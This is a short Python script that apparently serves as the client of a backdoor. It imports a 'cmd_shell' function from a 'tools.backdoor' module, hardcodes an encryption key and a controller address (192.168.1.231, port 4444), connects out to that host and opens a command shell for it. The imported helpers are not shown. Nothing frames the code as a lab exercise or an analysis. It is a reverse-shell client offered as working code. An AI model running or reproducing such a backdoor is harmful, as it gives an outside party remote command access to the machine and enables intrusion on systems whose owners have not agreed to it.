from utils.connection import connect_master
from tools.backdoor import cmd_shell


if __name__ == "__main__":
    key = "wabbalabbadabbdabb"
    KEY = bytes(key, 'utf-8')
    master_hostname = "192.168.1.231"
    master_port = 4444
    conn = connect_master(master_hostname, master_port)
    cmd_shell(conn, master_hostname, master_port, KEY)
